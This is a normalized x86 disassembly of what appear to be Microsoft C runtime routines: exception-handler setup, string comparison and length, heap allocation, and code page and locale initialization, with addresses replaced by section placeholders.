push esi
xor esi esi
cmp ecx esi
jne r-xdata
mov eax [ rw-data ]
cmp eax esi
je r-xdata
call sub_406b99
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_406efa
add esp 0x14
push 0x16
pop eax
pop esi
retn
mov [ ecx ] eax
xor eax eax
pop esi
retn
sub_405534
mov eax [ esp + 0x4 ]
push esi
xor esi esi
cmp eax esi
jne r-xdata
cmp [ rw-data ] esi
je r-xdata
call sub_406b99
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_406efa
add esp 0x14
push 0x16
pop eax
pop esi
retn
mov ecx [ rw-data ]
mov [ eax ] ecx
xor eax eax
pop esi
retn
sub_405570
cmp [ r--data ] 0x0
je r-xdata
call sub_408bdf
push r--data
push r--data
call sub_4054dd
test eax eax
pop ecx
pop ecx
jne r-xdata
push r--data
call sub_408c80
test eax eax
pop ecx
je r-xdata
retn
push esi
push edi
push sub_4079d6
call sub_402b39
mov esi r--data
mov eax esi
mov edi r--data
cmp eax edi
pop ecx
jae r-xdata
push [ esp + 0x4 ]
call [ r--data ]
pop ecx
cmp [ rw-data ] 0x0
pop edi
pop esi
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
xor eax eax
push rw-data
call sub_408c80
test eax eax
pop ecx
je r-xdata
add esi 0x4
cmp esi edi
jb r-xdata
call eax
push 0x0
push 0x2
push 0x0
call [ rw-data ]
sub_405602
push 0x10
push r--data
call sub_405770
push 0x8
call sub_407d76
pop ecx
xor edi edi
mov [ ebp - 0x4 ] edi
xor ebx ebx
inc ebx
cmp [ rw-data ] ebx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4056cf
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ rw-data ] ebx
mov al [ ebp + 0x10 ]
mov [ rw-data ] al
cmp [ ebp + 0xc ] edi
jne r-xdata
call sub_4057b5
retn
mov [ rw-data ] ebx
push 0x8
call sub_407c9e
pop ecx
push [ ebp + 0x8 ]
call sub_40549e
push r--data
mov eax r--data
call sub_4054c5
pop ecx
push [ rw-data ]
call sub_404e05
mov [ ebp - 0x1c ] eax
push [ rw-data ]
call sub_404e05
pop ecx
pop ecx
mov esi eax
mov [ ebp - 0x20 ] esi
cmp [ ebp - 0x1c ] edi
je r-xdata
push r--data
mov eax r--data
call sub_4054c5
pop ecx
sub esi 0x4
mov [ ebp - 0x20 ] esi
cmp esi [ ebp - 0x1c ]
jb r-xdata
cmp [ esi ] 0x0
je r-xdata
mov edi [ esi ]
call sub_404dfc
cmp edi eax
je r-xdata
push edi
call sub_404e05
pop ecx
call eax
jmp r-xdata
sub_405724
push esi
call sub_404dfc
mov esi eax
push esi
call sub_406c98
push esi
call sub_408f59
push esi
call sub_406df4
push esi
call sub_408f4f
push esi
call sub_408f45
push esi
call sub_408d3b
push esi
call sub_41f5ef
push esi
call sub_405b79
push sub_4056f5
call sub_404d8e
add esp 0x24
mov [ rw-data ] eax
pop esi
retn
sub_405770
push sub_4057d0
push [ fs : 0x0 ]
mov eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ebp
lea ebp [ esp + 0x10 ]
sub esp eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x4 ] eax
xor eax ebp
push eax
mov [ ebp - 0x18 ] esp
push [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
retn
sub_4057d0
sub esp 0x14
push ebx
mov ebx [ esp + 0x20 ]
push ebp
push esi
mov esi [ ebx + 0x8 ]
xor esi [ rw-data ]
push edi
mov eax [ esi ]
cmp eax 0xfffffffe
mov [ esp + 0x13 ] 0x0
mov [ esp + 0x18 ] 0x1
lea edi [ ebx + 0x10 ]
je r-xdata
mov ecx [ esi + 0xc ]
mov eax [ esi + 0x8 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_409038
mov eax [ esp + 0x28 ]
test [ eax + 0x4 ] 0x66
jne r-xdata
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_409038
cmp [ ebx + 0xc ] 0xfffffffe
je r-xdata
mov ebp [ ebx + 0xc ]
cmp ebp 0xfffffffe
mov ecx [ esp + 0x30 ]
lea edx [ esp + 0x1c ]
mov [ esp + 0x1c ] eax
mov [ esp + 0x20 ] ecx
mov [ ebx - 0x4 ] edx
je r-xdata
mov eax [ esp + 0x18 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x14
retn
push rw-data
push edi
mov ecx ebx
mov edx 0xfffffffe
call sub_409184
jmp r-xdata
lea eax [ ebp + ebp * 2 ]
mov ecx [ esi + eax * 4 + 0x14 ]
test ecx ecx
lea ebx [ esi + eax * 4 + 0x10 ]
mov eax [ ebx ]
mov [ esp + 0x14 ] eax
je r-xdata
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
cmp eax 0xfffffffe
mov ebp eax
jne r-xdata
mov edx edi
call sub_40913a
test eax eax
mov [ esp + 0x13 ] 0x1
jl r-xdata
mov ecx [ esi + 0xc ]
mov eax [ esi + 0x8 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_409038
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_409038
cmp [ esp + 0x13 ] 0x0
je r-xdata
mov [ esp + 0x18 ] 0x0
jmp r-xdata
jg r-xdata
mov ecx [ esp + 0x28 ]
cmp [ ecx ] 0xe06d7363
jne r-xdata
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x2c ]
call sub_40916a
mov eax [ esp + 0x2c ]
cmp [ eax + 0xc ] ebp
je r-xdata
cmp [ r--data ] 0x0
je r-xdata
mov ecx [ esp + 0x14 ]
mov [ eax + 0xc ] ecx
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
push rw-data
push edi
mov edx ebp
mov ecx eax
call sub_409184
mov eax [ esp + 0x2c ]
push r--data
call sub_408c80
add esp 0x4
test eax eax
je r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_409038
mov ecx [ ebx + 0x8 ]
mov edx edi
jmp r-xdata
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_409038
mov edx [ esp + 0x28 ]
push 0x1
push edx
call [ r--data ]
add esp 0x8
mov ebp edx
mov esi ecx
mov eax ecx
push 0x1
call sub_409fc5
xor eax eax
xor ebx ebx
xor ecx ecx
xor edx edx
xor edi edi
jmp esi
sub_405966
push 0xc
push r--data
call sub_405770
push 0xe
call sub_407d76
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4059cd
call sub_4057b5
retn
mov eax [ rw-data ]
mov edx rw-data
push [ esi + 0x4 ]
call sub_405a68
pop ecx
and [ esi + 0x4 ] 0x0
cmp [ eax ] ecx
jne r-xdata
mov edx eax
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov [ edx + 0x4 ] ecx
push eax
call sub_405a68
pop ecx
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
sub_4059e0
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
test edx 0x3
jne r-xdata
test edx 0x1
je r-xdata
mov eax [ edx ]
cmp al [ ecx ]
jne r-xdata
mov ax [ edx ]
add edx 0x2
cmp al [ ecx ]
jne r-xdata
mov al [ edx ]
add edx 0x1
cmp al [ ecx ]
jne r-xdata
sbb eax eax
shl eax 0x1
add eax 0x1
retn
or al al
je r-xdata
or al al
je r-xdata
add ecx 0x1
or al al
je r-xdata
xor eax eax
retn
cmp ah [ ecx + 0x1 ]
jne r-xdata
cmp ah [ ecx + 0x1 ]
jne r-xdata
test edx 0x2
je r-xdata
or ah ah
je r-xdata
or ah ah
je r-xdata
shr eax 0x10
cmp al [ ecx + 0x2 ]
jne r-xdata
add ecx 0x2
jmp r-xdata
or al al
je r-xdata
cmp ah [ ecx + 0x3 ]
jne r-xdata
add ecx 0x4
add edx 0x4
or ah ah
jne r-xdata
mov edi edi
sub_405a68
push 0xc
push r--data
call sub_405770
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_4057b5
retn
cmp [ rw-data ] 0x3
jne r-xdata
push esi
push 0x4
call sub_407d76
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_408128
pop ecx
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
call sub_406b99
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_406b5e
mov [ esi ] eax
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_405abe
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
push esi
push eax
call sub_408153
pop ecx
pop ecx
push [ ebp + 0x8 ]
jmp r-xdata
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
test eax eax
jne r-xdata
sub_405b42
push 0x8
push r--data
call sub_405770
push [ rw-data ]
call sub_404e05
pop ecx
test eax eax
je r-xdata
jmp sub_405af6
and [ ebp - 0x4 ] 0x0
call eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
sub_405b8a
mov ecx [ esp + 0x4 ]
push ebx
xor ebx ebx
cmp ecx ebx
push esi
push edi
je r-xdata
call sub_406b99
push 0x16
pop esi
mov [ eax ] esi
mov edi [ esp + 0x14 ]
cmp edi ebx
ja r-xdata
pop edi
pop esi
pop ebx
retn
mov esi [ esp + 0x18 ]
cmp esi ebx
jne r-xdata
mov edx ecx
mov [ ecx ] bl
jmp r-xdata
cmp edi ebx
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ ecx ] bl
call sub_406b99
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov al [ esi ]
mov [ edx ] al
inc edx
inc esi
cmp al bl
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_406efa
add esp 0x14
mov eax esi
jmp r-xdata
sub_405bef
push 0xc
push r--data
call sub_405770
and [ ebp - 0x1c ] 0x0
mov esi [ ebp + 0x8 ]
cmp esi [ rw-data ]
ja r-xdata
mov eax [ ebp - 0x1c ]
call sub_4057b5
retn
push 0x4
call sub_407d76
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_4088fc
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_405c35
sub_405c3e
push ebp
mov ebp [ esp + 0x8 ]
cmp ebp 0xffffffe0
ja r-xdata
push ebp
call sub_406ca2
pop ecx
call sub_406b99
mov [ eax ] 0xc
xor eax eax
pop ebp
retn
push ebx
mov ebx [ HeapAlloc@IAT ]
push esi
push edi
mov eax [ rw-data ]
cmp eax 0x1
jne r-xdata
call sub_407109
push 0x1e
call sub_406f69
push 0xff
call sub_40549e
cmp eax 0x3
jne r-xdata
cmp ebp esi
je r-xdata
cmp ebp esi
jne r-xdata
push ebp
call sub_405bef
cmp eax esi
pop ecx
jne r-xdata
xor eax eax
inc eax
mov eax ebp
jmp r-xdata
add edi 0xf
and edi 0xfffffff0
push edi
xor edi edi
inc edi
mov esi eax
test esi esi
jne r-xdata
push esi
push [ rw-data ]
call ebx
push eax
jmp r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn
cmp [ rw-data ] eax
push 0xc
pop edi
je r-xdata
call sub_406b99
mov [ eax ] edi
push ebp
call sub_406ca2
test eax eax
pop ecx
jne r-xdata
xor esi esi
cmp [ rw-data ] esi
mov edi ebp
jne r-xdata
jmp r-xdata
call sub_406b99
mov [ eax ] edi
sub_405d10
mov ecx [ esp + 0x4 ]
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
add ecx 0x1
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea eax [ ecx - 0x1 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ecx 0x3
jne r-xdata
lea eax [ ecx - 0x4 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ah ah
je r-xdata
add eax 0x0
lea esp [ esp ]
lea esp [ esp ]
lea eax [ ecx - 0x3 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff0000
je r-xdata
lea eax [ ecx - 0x2 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff000000
je r-xdata
jmp r-xdata
sub_405d9b
sub eax 0x3a4
je r-xdata
mov eax 0x411
retn
sub eax 0x4
je r-xdata
mov eax 0x804
retn
sub eax 0xd
je r-xdata
mov eax 0x412
retn
dec eax
je r-xdata
mov eax 0x404
retn
xor eax eax
retn
sub_405dca
push ebx
push ebp
push esi
push edi
mov ebp 0x101
mov esi eax
push ebp
xor edi edi
lea ebx [ esi + 0x1c ]
push edi
push ebx
call sub_4031e0
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
xor eax eax
lea edi [ esi + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov eax rw-data
add esp 0xc
sub eax esi
mov cl [ eax + ebx ]
mov [ ebx ] cl
inc ebx
dec ebp
jne r-xdata
lea ecx [ esi + 0x11d ]
mov esi 0x100
mov dl [ ecx + eax ]
mov [ ecx ] dl
inc ecx
dec esi
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
sub_405e1f
push ebp
lea ebp [ esp - 0x49c ]
sub esp 0x51c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x498 ] eax
push ebx
push edi
lea eax [ ebp - 0x7c ]
push eax
push [ esi + 0x4 ]
call [ GetCPInfo@IAT ]
test eax eax
mov edi 0x100
je r-xdata
lea eax [ esi + 0x11d ]
mov [ ebp - 0x80 ] 0xffffff9f
xor ecx ecx
sub [ ebp - 0x80 ] eax
xor eax eax
cmp edx 0x19
ja r-xdata
or [ esi + ecx + 0x1d ] 0x10
mov dl cl
add dl 0x20
jmp r-xdata
mov [ ebp + eax + 0x398 ] al
inc eax
cmp eax edi
jb r-xdata
mov al [ ebp - 0x76 ]
test al al
mov [ ebp + 0x398 ] 0x20
je r-xdata
mov [ eax ] 0x0
or [ esi + ecx + 0x1d ] 0x20
mov dl cl
sub dl 0x20
mov [ eax ] dl
jmp r-xdata
push 0x0
push [ esi + 0xc ]
lea eax [ ebp - 0x68 ]
push [ esi + 0x4 ]
push eax
push edi
lea eax [ ebp + 0x398 ]
push eax
push 0x1
push 0x0
call sub_409446
xor ebx ebx
push ebx
push [ esi + 0x4 ]
lea eax [ ebp + 0x298 ]
push edi
push eax
push edi
lea eax [ ebp + 0x398 ]
push eax
push edi
push [ esi + 0xc ]
push ebx
call sub_406b1b
add esp 0x44
push ebx
push [ esi + 0x4 ]
lea eax [ ebp + 0x198 ]
push edi
push eax
push edi
lea eax [ ebp + 0x398 ]
push eax
push 0x200
push [ esi + 0xc ]
push ebx
call sub_406b1b
add esp 0x24
xor eax eax
lea ebx [ ebp - 0x75 ]
mov edx [ ebp - 0x80 ]
lea eax [ esi + ecx + 0x11d ]
add edx eax
lea ebx [ edx + 0x20 ]
cmp ebx 0x19
ja r-xdata
mov ecx [ ebp + 0x498 ]
pop edi
xor ecx ebp
pop ebx
call sub_409038
add ebp 0x49c
leave
retn
inc ecx
cmp ecx edi
jb r-xdata
test cl 0x2
je r-xdata
or [ esi + eax + 0x1d ] 0x10
mov cl [ ebp + eax + 0x298 ]
jmp r-xdata
inc ebx
mov al [ ebx ]
inc ebx
test al al
jne r-xdata
sub eax ecx
inc eax
push eax
lea edx [ ebp + ecx + 0x398 ]
push 0x20
push edx
call sub_4031e0
add esp 0xc
mov [ esi + eax + 0x11d ] 0x0
or [ esi + eax + 0x1d ] 0x20
mov cl [ ebp + eax + 0x198 ]
mov [ esi + eax + 0x11d ] cl
jmp r-xdata
movzx ecx al
movzx eax [ ebx ]
cmp ecx eax
ja r-xdata
movzx ecx [ ebp + eax * 2 - 0x68 ]
test cl 0x1
je r-xdata
jmp r-xdata
inc eax
cmp eax edi
jb r-xdata
sub_405fa9
push 0xc
push r--data
call sub_405770
call sub_405021
mov edi eax
mov eax [ rw-data ]
test [ edi + 0x70 ] eax
je r-xdata
push 0xd
call sub_407d76
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ edi + 0x68 ]
mov [ ebp - 0x1c ] esi
cmp esi [ rw-data ]
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_406044
jmp r-xdata
test esi esi
je r-xdata
mov esi [ edi + 0x68 ]
test esi esi
jne r-xdata
mov eax [ rw-data ]
mov [ edi + 0x68 ] eax
mov esi [ rw-data ]
mov [ ebp - 0x1c ] esi
push esi
call [ InterlockedIncrement@IAT ]
push esi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax esi
call sub_4057b5
retn
push 0x20
call sub_405454
pop ecx
cmp esi rw-data
je r-xdata
push esi
call sub_405a68
pop ecx
sub_40604d
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
push ebx
lea ecx [ ebp - 0x10 ]
call sub_403014
cmp esi 0xfffffffe
mov [ rw-data ] ebx
jne r-xdata
cmp esi 0xfffffffd
jne r-xdata
mov [ rw-data ] 0x1
call [ GetOEMCP@IAT ]
cmp esi 0xfffffffc
jne r-xdata
mov [ rw-data ] 0x1
call [ GetACP@IAT ]
jmp r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
mov [ rw-data ] 0x1
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax esi
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_4060c7
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
call sub_40604d
mov edi eax
xor esi esi
cmp edi esi
mov [ ebp + 0x8 ] edi
jne r-xdata
mov [ ebp - 0x1c ] esi
xor eax eax
mov eax ebx
call sub_405dca
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_4031e0
mov ecx [ ebp - 0x1c ]
add esp 0xc
imul ecx ecx 0x30
mov [ ebp - 0x20 ] esi
lea esi [ ecx + rw-data ]
mov [ ebp - 0x1c ] esi
jmp r-xdata
inc [ ebp - 0x1c ]
add eax 0x30
cmp eax 0xf0
jb r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_409038
leave
retn
cmp [ esi ] 0x0
jne r-xdata
cmp [ eax + rw-data ] edi
je r-xdata
cmp edi 0xfde8
je r-xdata
mov al [ esi + 0x1 ]
test al al
je r-xdata
mov esi [ ebp - 0x1c ]
inc [ ebp - 0x20 ]
add esi 0x8
cmp [ ebp - 0x20 ] 0x4
mov [ ebp - 0x1c ] esi
jb r-xdata
or eax 0xffffffff
cmp edi 0xfde9
je r-xdata
movzx edi [ esi ]
movzx eax al
jmp r-xdata
mov eax edi
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x8 ] 0x1
call sub_405d9b
push 0x6
mov [ ebx + 0xc ] eax
lea eax [ ebx + 0x10 ]
lea ecx [ ecx + rw-data ]
pop edx
movzx eax di
push eax
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
cmp edi eax
jbe r-xdata
mov si [ ecx ]
inc ecx
mov [ eax ] si
inc ecx
inc eax
inc eax
dec edx
jne r-xdata
mov esi ebx
call sub_405e1f
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
push edi
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x20 ]
mov al [ eax + rw-data ]
or [ ebx + edi + 0x1d ] al
movzx eax [ esi + 0x1 ]
inc edi
mov edi [ ebp + 0x8 ]
inc esi
inc esi
xor eax eax
jmp r-xdata
cmp [ rw-data ] esi
jne r-xdata
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_4031e0
xor edx edx
inc edx
add esp 0xc
cmp [ ebp - 0x18 ] edx
mov [ ebx + 0x4 ] edi
mov [ ebx + 0xc ] esi
jbe r-xdata
mov [ ebx + 0x8 ] esi
cmp [ ebp - 0x12 ] 0x0
je r-xdata
lea eax [ ebx + 0x1e ]
mov ecx 0xfe
lea esi [ ebp - 0x11 ]
or [ eax ] 0x8
inc eax
dec ecx
jne r-xdata
mov eax [ ebx + 0x4 ]
call sub_405d9b
mov [ ebx + 0xc ] eax
mov [ ebx + 0x8 ] edx
jmp r-xdata
movzx eax [ esi - 0x1 ]
movzx ecx cl
jmp r-xdata
xor eax eax
lea edi [ ebx + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
cmp eax ecx
jbe r-xdata
or [ ebx + eax + 0x1d ] 0x4
inc eax
inc esi
inc esi
cmp [ esi - 0x1 ] 0x0
jne r-xdata
mov cl [ esi ]
test cl cl
je r-xdata
sub_4062a0
push 0x14
push r--data
call sub_405770
or [ ebp - 0x20 ] 0xffffffff
call sub_405021
mov edi eax
mov [ ebp - 0x24 ] edi
call sub_405fa9
mov ebx [ edi + 0x68 ]
mov esi [ ebp + 0x8 ]
call sub_40604d
mov [ ebp + 0x8 ] eax
cmp eax [ ebx + 0x4 ]
je r-xdata
and [ ebp - 0x20 ] 0x0
push 0x220
call sub_4052de
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x20 ]
call sub_4057b5
retn
mov ecx 0x88
mov esi [ edi + 0x68 ]
mov edi ebx
[ edi ] [ esi ]
and [ ebx ] 0x0
push ebx
push [ ebp + 0x8 ]
call sub_4060c7
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
mov esi [ ebp - 0x24 ]
push [ esi + 0x68 ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
cmp ebx rw-data
je r-xdata
mov [ esi + 0x68 ] ebx
push ebx
mov edi [ InterlockedIncrement@IAT ]
call edi
test [ esi + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x68 ]
cmp eax rw-data
je r-xdata
call sub_406b99
mov [ eax ] 0x16
jmp r-xdata
push ebx
call sub_405a68
pop ecx
test [ rw-data ] 0x1
jne r-xdata
push eax
call sub_405a68
pop ecx
push 0xd
call sub_407d76
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebx + 0x4 ]
mov [ rw-data ] eax
mov eax [ ebx + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebx + 0xc ]
mov [ rw-data ] eax
xor eax eax
xor eax eax
mov cx [ ebx + eax * 2 + 0x10 ]
mov [ eax * 2 + rw-data ] cx
inc eax
jmp r-xdata
xor eax eax
mov cl [ eax + ebx + 0x1c ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x5
jge r-xdata
push [ rw-data ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov cl [ eax + ebx + 0x11d ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x101
jge r-xdata
mov [ rw-data ] ebx
push ebx
call edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_406401
jmp r-xdata
mov eax [ rw-data ]
cmp eax rw-data
je r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x100
jge r-xdata
push eax
call sub_405a68
pop ecx
sub_406458
push ebx
push ebp
push esi
mov esi [ esp + 0x10 ]
mov eax [ esi + 0xbc ]
xor ebp ebp
cmp eax ebp
push edi
je r-xdata
mov eax [ esi + 0xc0 ]
cmp eax ebp
je r-xdata
cmp eax rw-data
je r-xdata
lea edi [ esi + 0xd4 ]
mov eax [ edi ]
cmp eax rw-data
je r-xdata
cmp [ eax ] ebp
jne r-xdata
mov eax [ esi + 0xb0 ]
cmp eax ebp
je r-xdata
push 0x6
lea edi [ esi + 0x50 ]
pop ebx
cmp [ eax + 0xb4 ] ebp
jne r-xdata
mov eax [ esi + 0xc4 ]
sub eax 0xfe
push eax
call sub_405a68
mov eax [ esi + 0xcc ]
mov edi 0x80
sub eax edi
push eax
call sub_405a68
mov eax [ esi + 0xd0 ]
sub eax edi
push eax
call sub_405a68
push [ esi + 0xc0 ]
call sub_405a68
add esp 0x10
cmp [ eax ] ebp
jne r-xdata
cmp [ edi - 0x4 ] ebp
je r-xdata
mov eax [ edi ]
cmp eax ebp
je r-xdata
push eax
call sub_409486
push [ edi ]
call sub_405a68
pop ecx
pop ecx
mov eax [ esi + 0xb8 ]
cmp eax ebp
je r-xdata
add edi 0x10
dec ebx
jne r-xdata
mov eax [ edi + 0x4 ]
cmp eax ebp
je r-xdata
cmp [ eax ] ebp
jne r-xdata
mov eax [ esi + 0xb4 ]
cmp eax ebp
je r-xdata
cmp [ eax ] ebp
jne r-xdata
cmp [ edi - 0x8 ] rw-data
je r-xdata
push esi
call sub_405a68
pop ecx
pop edi
pop esi
pop ebp
pop ebx
retn
cmp [ eax ] ebp
jne r-xdata
push eax
call sub_405a68
pop ecx
push [ esi + 0xb0 ]
call sub_405a68
push [ esi + 0xbc ]
call sub_405a68
pop ecx
pop ecx
cmp [ eax ] ebp
jne r-xdata
push eax
call sub_405a68
push [ esi + 0xbc ]
call sub_409656
pop ecx
pop ecx
push eax
call sub_405a68
pop ecx
push eax
call sub_405a68
push [ esi + 0xbc ]
call sub_409616
pop ecx
pop ecx
sub_406598
push ebx
push ebp
push esi
mov esi [ esp + 0x10 ]
push edi
mov edi [ InterlockedIncrement@IAT ]
push esi
call edi
mov eax [ esi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ esi + 0xb8 ]
test eax eax
je r-xdata
push eax
call edi
mov eax [ esi + 0xb4 ]
test eax eax
je r-xdata
push eax
call edi
mov eax [ esi + 0xc0 ]
test eax eax
je r-xdata
push eax
call edi
push 0x6
lea ebx [ esi + 0x50 ]
pop ebp
push eax
call edi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec ebp
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call edi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ esi + 0xd4 ]
add eax 0xb4
push eax
call edi
pop edi
pop esi
pop ebp
pop ebx
retn
push eax
call edi
sub_40661e
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
mov eax esi
pop esi
retn
push ebx
push ebp
push edi
mov edi [ InterlockedDecrement@IAT ]
push esi
call edi
mov eax [ esi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ esi + 0xb8 ]
test eax eax
je r-xdata
push eax
call edi
mov eax [ esi + 0xb4 ]
test eax eax
je r-xdata
push eax
call edi
mov eax [ esi + 0xc0 ]
test eax eax
je r-xdata
push eax
call edi
push 0x6
lea ebx [ esi + 0x50 ]
pop ebp
push eax
call edi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec ebp
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call edi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ esi + 0xd4 ]
add eax 0xb4
push eax
call edi
pop edi
pop ebp
pop ebx
push eax
call edi
sub_4066aa
test edi edi
je r-xdata
xor eax eax
retn
test eax eax
je r-xdata
push esi
mov esi [ eax ]
cmp esi edi
je r-xdata
mov eax edi
pop esi
retn
push edi
mov [ eax ] edi
call sub_406598
test esi esi
pop ecx
je r-xdata
push esi
call sub_40661e
cmp [ esi ] 0x0
pop ecx
jne r-xdata
cmp esi rw-data
je r-xdata
push esi
call sub_406458
pop ecx
sub_4066e8
push 0xc
push r--data
call sub_405770
call sub_405021
mov esi eax
mov eax [ rw-data ]
test [ esi + 0x70 ] eax
je r-xdata
push 0xc
call sub_407d76
pop ecx
and [ ebp - 0x4 ] 0x0
lea eax [ esi + 0x6c ]
mov edi [ rw-data ]
call sub_4066aa
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_406752
jmp r-xdata
cmp [ esi + 0x6c ] 0x0
je r-xdata
test esi esi
jne r-xdata
call sub_405021
mov esi [ eax + 0x6c ]
mov eax esi
call sub_4057b5
retn
push 0x20
call sub_405454
pop ecx
sub_406779
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
xor ebx ebx
cmp [ rw-data ] ebx
push edi
mov esi ecx
jne r-xdata
cmp [ ebp + 0x14 ] ebx
jle r-xdata
push ebx
push ebx
xor edi edi
inc edi
push edi
push r--data
push 0x100
push ebx
call [ LCMapStringW@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax 0x2
je r-xdata
mov ecx [ ebp + 0x14 ]
mov eax [ ebp + 0x10 ]
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] edi
jmp r-xdata
cmp [ ebp + 0x8 ] ebx
